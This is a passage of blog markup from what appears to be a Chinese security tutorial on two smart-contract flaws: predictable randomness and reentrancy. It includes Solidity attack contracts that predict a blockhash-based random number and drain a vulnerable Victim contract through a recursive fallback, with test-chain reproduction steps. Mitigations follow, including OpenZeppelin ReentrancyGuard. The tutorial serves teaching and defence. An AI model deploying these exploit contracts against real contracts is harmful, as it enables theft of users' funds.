title="攻击合约"></a>攻击合约</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br><br>contract Attack &#123;<br>    fallback() external payable &#123;<br>        <br>    &#125;<br>    <br>    function attack(GuessTheRandomNumber guessTheRandomNumber) public &#123;<br>        uint answer = uint(keccak256(abi.encodePacked(<br>            blockhash(block.number - 1),<br>            block.timestamp<br>            )));<br>            <br>        guessTheRandomNumber.guess(answer);<br>    &#125;<br>    <br>    function getBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><ul><li>在remix中运行的时候选择Web3 Provider，注意这里的Web3 Provider Endpoint应匹配使用ganache-cli中的端口</li></ul><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109204630219.png" alt="image-20211109204630219"></p><ul><li>分别为攻击者和受害者创建智能合约</li></ul><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109213007345.png" alt="image-20211109213007345"></p><ul><li>输入受害者合约地址进行攻击后，即可看到猜测成功，余额增加</li></ul><p><img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/image-20211109213117127.png" alt="image-20211109213117127"></p><h2 id="较安全伪随机数的产生方法"><a href="#较安全伪随机数的产生方法" class="headerlink" title="较安全伪随机数的产生方法"></a>较安全伪随机数的产生方法</h2><h3 id="hash-commit-reveal"><a href="#hash-commit-reveal" class="headerlink" title="hash-commit-reveal"></a>hash-commit-reveal</h3><p>hash-commit-reveal被很多合约开发者视为随机数的最佳实践方案，已经被广泛应用于大量的DAPP中，这里我们来看看它的工作原理。</p><p>hash-commit-reveal的本质，是合约调用者和随机数提供者（通常情况下是某外部预言机）在波场区块链平台上通过一系列协议来生成随机数。</p><p><a href="https://github.com/dice2-win/contracts/blob/master/Dice2Win.sol">Dice2Win</a>采用混合模式, 巧妙地解决随机数弱, 且容易被预测的问题. 其整个流程如下:<br>　　<img src="/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/305284-20190417142813698-919642959.png" alt="img"><br>　　<strong>1. 玩家指定行动计划, 并生产对应的hash值.</strong><br>　　<strong>2. 服务端收到玩家的hash值, 产生随机值reveal, 然后根据reveal生产commit值, 把这个返回给玩家</strong><br>　　<strong>3. 玩家带着commit和行动信息, 在智能合约下真正下注</strong><br>　　<strong>4. 服务端发起结算, 带着真正的reveal值去结算</strong><br>　　中间的行动计划和reveal没法中途修改, 因为有hash值的验证<br>　　其本质的思想是<em><strong>hash-commit-reveal</strong></em>, 其核心的思想是: <strong>服务端不知道玩家的行为, 玩家不知道服务端真正的随机数</strong>. 而最终结果在合约里验证hash, 并给出预期的结果. 这样的流程, 保证玩家和服务端都满意。</p><p>此类随机数生成策略的缺点也是很明显的：高度依赖于预言机（<code>secretSigner</code>）对合约的回调。因此，预言机有选择性回调的作恶风险。</p><h3 id="Oraclize"><a href="#Oraclize" class="headerlink" title="Oraclize"></a>Oraclize</h3><p>Oraclize定位为去中心化应用的数据搬运工，它作为Web APIs和DApp的可靠链接，有了Oraclize，就不需要建立额外的信任链，因为我们的行为已经被强制加密验证。</p><p>Oraclize 提供了一个连接以太坊与外部环境(互联网)的桥梁。通过 Oraclize，智能合约能够通过 web API 请求数据。如当前的兑换率，天气预报或股票价格。其中一个最大的作用是能提供伪随机数。一些合约通过 Oraclize 中的 URL 连接器来连接 <a href="http://random.org/">random.org</a> 来获取伪随机数。</p><p>Oraclize是一个可证明的诚实的预言机服务，可以让智能合约访问互联网，Oraclize是平台无关的，为所有主流的智能合约平台提供一种虚拟的接口，通过Oraclize投入大量有意义的数据到区块链中，可以使得智能合约产业更加繁荣，让更多有价值的应用呈现更大的生命力，Oraclize的使用方式可以参考下面的代码：</p><p><a href="https://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol">https://github.com/oraclize/ethereum-examples/blob/master/solidity/random-datasource/randomExample.sol</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/*<br>   Oraclize random-datasource example<br>   This contract uses the random-datasource to securely generate off-chain N random bytes<br>*/<br><br>pragma solidity ^0.4.11;<br><br>import &quot;github.com/oraclize/ethereum-api/oraclizeAPI.sol&quot;;<br><br>contract RandomExample is usingOraclize &#123;<br>    <br><br>    event newRandomNumber_bytes(bytes);<br>    event newRandomNumber_uint(uint);<br>     <br>    function RandomExample() &#123;<br>        oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof in the constructor<br>        update(); // let&#x27;s ask for N random bytes immediately when the contract is created!<br>    &#125;<br>    <br>    // the callback function is called by Oraclize when the result is ready<br>    // the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:<br>    // the proof validity is fully verified on-chain<br>    function __callback(bytes32 _queryId, string _result, bytes _proof)<br>    &#123; <br>        // if we reach this point successfully, it means that the attached authenticity proof has passed!<br>        if (msg.sender != oraclize_cbAddress()) throw;<br>        <br>        if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) &#123;<br>            // the proof verification has failed, do we need to take any action here? (depends on the use case)<br>        &#125; else &#123;<br>            // the proof verification has passed<br>            // now that we know that the random number was safely generated, let&#x27;s use it..<br>            <br>            newRandomNumber_bytes(bytes(_result)); // this is the resulting random number (bytes)<br>            <br>            // for simplicity of use, let&#x27;s also convert the random bytes to uint if we need<br>            uint maxRange = 2**(8* 7); // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return<br>            uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range<br>            <br>            newRandomNumber_uint(randomNumber); // this is the resulting random number (uint)<br>        &#125;<br>    &#125;<br>    <br>    function update() payable &#123; <br>        uint N = 7; // number of random bytes we want the datasource to return<br>        uint delay = 0; // number of seconds to wait before the execution takes place<br>        uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function<br>        bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>考虑一个提供打赌的智能合约，用户调用打赌的接口，这个接口会把用户的请求存储起来，然后调用Oracle随机数生成服务，然后通过Oracle回调服务，判断随机数是否大于某个值，如果成立，那么用户成功，否则用户失败，这就是典型的Oracle的使用案例。</p><h3 id="Randao"><a href="#Randao" class="headerlink" title="Randao"></a>Randao</h3><p>RANDAO 机制就是，当用户通过储存（质押）32 ETH 成为验证者之后，该用户可以任意选定一个随机数。当需要为某个区块公布随机数时，将所有验证者的随机数加起来就可以得到一个全新的随机数。</p><p><a href="https://github.com/randao/randao">randao</a>是一个DAO(去中心化的匿名组织)允许任何人加入，随机数由所有参与者一起合作生成，首先我们需要在区块链上创建一个RANDAO的智能合约，合约定义了参与规则，然后生成随机数的基本过程可以分为下面三个步骤：</p><p>第一步：收集有效的sha3(s)：参与随机数生成的参与者，首先需要在一个指定的时间区间(比如6个区块的区间，大约72秒)发送m ETH作为抵押到智能合约C，同时发送一个sha3(s)的值到智能合约C ，s是一个只有参与者自己知道的数字<br>第二步:收集有效的s，在第一步结束后，那些提交了sha3(s)的参与者需要在指定的时间区间内发送s到智能合约C，智能合约C会检查sha3(s)和之前提交的值是否相同，相同的s会被保存到种子集合用来最终生成随机数。<br>第三步:计算随机数并退回抵押和奖金，在所有的秘密数字s被成功收集后，智能合约C会使用函数f(s1,s2,…,sn)来计算随机数，随机数的结果会写入智能合约的存储，而且结果会被发送到所有之前请求随机数的其他智能合约上面，智能合约C会把第一阶段的抵押返回给参与者，然后奖金会被分成同等分发送给所有的参与者，奖金来源于请求随机值的其他智能合约。</p><p>RNG补充规则：</p><p>为了确保RNG不能被操控，以及为了安全和效率，智能合约C有以下的补充规则：</p><p>在第一步中，如果有两个或更多个的同样的sha3(s)被提交上来，那么只有第一个会被接受<br>在第一步中，对于参与者有最低要求，如果在指定时间区间内没有收集到足够多的sha3(s)的值，那么RNG在这个区块高度会失败<br>如果参与者提交了sha3(s),那么他必须在第二步提交s<br>如果参与者在第二步没有提交s，那么第一阶段提供的m ETH会被没收而且没有奖励<br>如果一个或者多个s没有在第二步被提交，RNG在这个区块高度会失败，没收的ETH会被分成同等分发送给提交了s的其他参与者，其他申请随机数的其他合约的费用会被退回</p><p>RNG激励机制：</p><p>RNG的周期非常短，例如一个小时20个生成周期，如果没有周期的利润是0.001%,一个月的盈利会达到0.00001 * 20 * 24 * 30 = 0.144，为了达到14.4%每个月的盈利，并且RNG平均有n个参与者，运行智能合约C的费用为n * 3 * 500 * gasPrice + Ccost，CCost是合约内部的gas消费，包括计算和存储)假设每个随机值平均有r个请求，每个请求的费用是p ETH, 那么收入是r*p. 所以每个参与者每一次参与会收到rp - 1500n * gasPrice - Ccost)/n,当前的gasPrice是10 szabo, 合约的消费大概是1500n gas， 所以大概的净收入是(rp/n-0.03)ETH. 假设每个RNG有10个参与者，并且抵押是1000ETH，所以如果RNG如果只请求一次，那么一次的费用是0.4 ETH, 如果请求是10次，那么一次请求的价格会被降到0.04ETH</p><p>RANDAO作为以太坊系统的基础设施，被其他的合约调用，不同的合约因为有不同的目的所以需要不同的随机值，有些需要高度加密的，比如说抽奖;有些需要稳定的回应，并且要求立即作出回应,这些合约本身的价值不高;有些需要回调函数，当随机值已经生成的时候需要接收到通知。</p><p>但即使在这种情况下，最后一个公开随机数的人也可以在一定程度上操纵随机数。最后一个人可以选择保持沉默，以这样或那样的方式改变这个最终的随机数：房间里的最后一个人可以记住之前每个人公布的数字，如此一来，就可以知道加上（或者不加上）他提供的数字之后的最终随机数结果。如果相对于其他数字，某个数字对最后一个人更有利，那最后一个人就有动机去进行某种程度的操纵，不管程度高低。</p><p>对于这一问题，以太坊 2.0 将通过 VDF（可验证延迟函数）来解决！</p><p>……</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智能合约重入漏洞</title>
    <link href="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>文章首发：<a href="https://forum.butian.net/share/878">奇安信攻防社区</a></p><p>重⼊攻击，可能是最着名的以太坊漏洞。合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式。两者叠加在一起造就了以太坊非常经典的重入漏洞。其中最有代表性的攻击是 <a href="https://en.wikipedia.org/wiki/The_DAO_(organization)">The DAO</a></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>外部恶意合约回调了受攻击合约上的一个函数，并在受攻击合约上的任意位置“重新进入”代码执行。因为原合约的程序员可能没有预料到合约代码可以被”重入“，因此合约会出现不可预知的行为。在 gas 足够的情况下，合约之间甚至可以相互循环调用，直至达到 gas 的上限，但是如果循环中有转账之类的操作，就会导致严重的后果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint _amount) public &#123;<br>require(balances[msg.sender] &gt;= _amount)<br>msg.sender.call.value(_amount)();<br>balances[msg.sender] -= _amount;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211025202430311.png" alt="image-20211025202430311"></p><p>其中，<code>fallback</code>函数是关键</p><h3 id="fallback函数"><a href="#fallback函数" class="headerlink" title="fallback函数"></a>fallback函数</h3><p>当我们调用某个智能合约时，如果指定的函数找不到，或者根本就没指定调用哪个函数（如向合约发送 ether）时，<code>fallback</code> 函数就会被调用。</p><p>向合约发送 send、transfer、call 消息时候都会调用 <code>fallback</code> 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 <code>fallback</code> 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 <code>fallback</code> 函数，这有可能导致循环调用。</p><p>而<code>fallback</code>函数是可以被重写的</p><p>如果构造一个 <code>fallback</code> 函数，函数里面也调用对方的 <code>withdraw</code> 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）</p><h2 id="漏洞demo"><a href="#漏洞demo" class="headerlink" title="漏洞demo"></a>漏洞demo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.10;<br>contract Victim &#123;<br>mapping(address =&gt; uint) public balances;<br>address public owner;<br>    <br>    //构造函数，设定合约所有者<br>    constructor() public &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>//接收资金转入<br>function deposit() public payable &#123;<br>balances[msg.sender] += msg.value;<br>&#125;<br><br>//提款<br>function withdraw(uint _amount) public &#123;<br>require(balances[msg.sender] &gt;= _amount);<br>msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>balances[msg.sender] -= _amount;<br>&#125;<br><br>//查询余额<br>function getBalance() public view returns(uint) &#123;<br>return address(this).balance;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>Victim public victim;<br><br>//设定受害者合约地址<br>constructor(address _victimAddress) public &#123;<br>victim = Victim(_victimAddress);<br>&#125;<br><br>//重写fallback<br>fallback() external payable &#123;<br>if(address(victim).balance &gt;= 1 ether)&#123;<br>victim.withdraw(1 ether);<br>&#125;<br>&#125;<br><br>//攻击，调用受害者的withdraw函数<br>function attack() external payable &#123;<br>require(msg.value &gt;= 1 ether);<br>victim.deposit&#123;value: 1 ether&#125;();<br>victim.withdraw(1 ether);<br>&#125;<br><br>//查询余额<br>function getBalance() public view returns(uint) &#123;<br>return address(this).balance;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="虚拟机中"><a href="#虚拟机中" class="headerlink" title="虚拟机中"></a>虚拟机中</h3><ul><li>分别为受害者和攻击者创建一个合约</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111011420.png" alt="image-20211026111011420"></p><ul><li>用deposit函数为受害者设定一定余额</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111204753.png" alt="image-20211026111204753"></p><ul><li>检查受害者余额</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111231368.png" alt="image-20211026111231368"></p><ul><li>进行攻击</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111416824.png" alt="image-20211026111416824"></p><ul><li>检查攻击者和受害者的余额</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111626852.png" alt="image-20211026111626852"></p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111639557.png" alt="image-20211026111639557"></p><h3 id="测试链上"><a href="#测试链上" class="headerlink" title="测试链上"></a>测试链上</h3><ul><li>部署受害者合约</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143200282.png" alt="image-20211030143200282"></p><ul><li><p>部署攻击者合约</p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143902046.png" alt="image-20211030143902046"></p></li><li><p>为受害者合约打入2eth</p></li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030144202275.png" alt="image-20211030144202275"></p><ul><li>攻击</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030151853031.png" alt="image-20211030151853031"></p><ul><li>结果</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152110108.png" alt="image-20211030152110108"></p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152151377.png" alt="image-20211030152151377"></p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152237814.png" alt="image-20211030152237814"></p><h3 id="重入次数"><a href="#重入次数" class="headerlink" title="重入次数"></a>重入次数</h3><p>由于gas的限制，重入次数是有一定限制的</p><p>调整参数，实验出最高重入次数</p><p>可以在区块链浏览器上查询到重入的次数</p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211110234242078.png" alt="image-20211110234242078"></p><p>大约是9次</p><p>注意，一旦 out of gas 就会攻击失败。</p><p>可以通过使用for循环、用受害者合约的某些状态、用if判断来控制重入次数</p><h2 id="规避建议"><a href="#规避建议" class="headerlink" title="规避建议"></a>规避建议</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>总是用 <code>send()</code>或<code>transfer()</code> 来发送 ether，而不是用 <code>call.value()</code>。因为transfer和send函数的gas仅有2300，这点gas仅够捕获一个event，所以将无法进行可重入攻击。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>确保在执行外部调用之前已经更新了所有的内部状态，这一模式被称为：Checks-Effects-Interactions（“检查-生效-交互”）</p><p>第一步，大多数函数会先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的以太币Ether ，用户是否具有token等等）。这些检查工作应该首先被完成。</p><p>第二步，如果所有检查都通过了，接下来进行更改合约状态变量的操作。</p><p>第三步，与其它合约的交互应该是任何函数的最后一步。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">require(balances[msg.sender] &gt; amount); //检查<br>require(this.balance &gt; amount); //检查<br>balances[msg.sender] -= amount; // 生效<br>to.call.value(amount)();  // 交互<br></code></pre></td></tr></table></figure><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><ol><li>使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，可防止重入调用</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool reEntrancyMutex = false;<br>function withdraw(uint _amount) public &#123;<br>require(!reEntrancyMutex);<br>reEntrancyMutex = true;<br>require(balances[msg.sender] &gt;= _amount);<br>msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>balances[msg.sender] -= _amount;<br>reEntrancyMutex = false;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>使用OpenZeppelin官方的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">ReentrancyGuard合约</a>的<code>nonReentrant</code> modifier。</li></ol><p>与互斥锁的思想差不多，但是其官方将其封装成函数修饰词使用。</p><p>在函数中增加<code>nonReentrant</code> modifier可保证其不可重入，任何对该函数的重入操作都将以revert the call的方式来拒绝。</p><p>当合约中有多个函数时，由于modifier的粒度在单个函数，若想完全避免重入，应对每个函数都添加<code>nonReentrant</code> modifier。否则，仍然可以通过其他函数来重入然后发起重入攻击，若该函数可能破坏不变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev Contract module that helps prevent reentrant calls to a function.<br> *<br> * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier<br> * available, which can be applied to functions to make sure there are no nested<br> * (reentrant) calls to them.<br> *<br> * Note that because there is a single `nonReentrant` guard, functions marked as<br> * `nonReentrant` may not call one another. This can be worked around by making<br> * those functions `private`, and then adding `external` `nonReentrant` entry<br> * points to them.<br> *<br> * TIP: If you would like to learn more about reentrancy and alternative ways<br> * to protect against it, check out our blog post<br> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].<br> */<br>abstract contract ReentrancyGuard &#123;<br>    // Booleans are more expensive than uint256 or any type that takes up a full<br>    // word because each write operation emits an extra SLOAD to first read the<br>    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write<br>    // back. This is the compiler&#x27;s defense against contract upgrades and<br>    // pointer aliasing, and it cannot be disabled.<br><br>    // The values being non-zero value makes deployment a bit more expensive,<br>    // but in exchange the refund on every call to nonReentrant will be lower in<br>    // amount. Since refunds are capped to a percentage of the total<br>    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to<br>    // increase the likelihood of the full refund coming into effect.<br>    uint256 private constant _NOT_ENTERED = 1;<br>    uint256 private constant _ENTERED = 2;<br><br>    uint256 private _status;<br><br>    constructor() &#123;<br>        _status = _NOT_ENTERED;<br>    &#125;<br><br>    /**<br>     * @dev Prevents a contract from calling itself, directly or indirectly.<br>     * Calling a `nonReentrant` function from another `nonReentrant`<br>     * function is not supported. It is possible to prevent this from happening<br>     * by making the `nonReentrant` function external, and making it call a<br>     * `private` function that does the actual work.<br>     */<br>    modifier nonReentrant() &#123;<br>        // On the first call to nonReentrant, _notEntered will be true<br>        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);<br><br>        // Any calls to nonReentrant after this point will fail<br>        _status = _ENTERED;<br><br>        _;<br><br>        // By storing the original value once again, a refund is triggered (see<br>        // https://eips.ethereum.org/EIPS/eip-2200)<br>        _status = _NOT_ENTERED;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>使用采用pull payment模式，OpenZeppelin提供了<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/PullPayment.sol">PullPayment合约</a>。</li></ol><p>其提供了<code>_asyncTransfer</code>函数，与<code>transfer</code>类似。然而，它不会将资金发送给接收者，而是将其转移到托管合约中。此外，PullPayment还为接收者提供了一个公共功能来提取（pull）他们的支付：<code>withdrawPayments</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 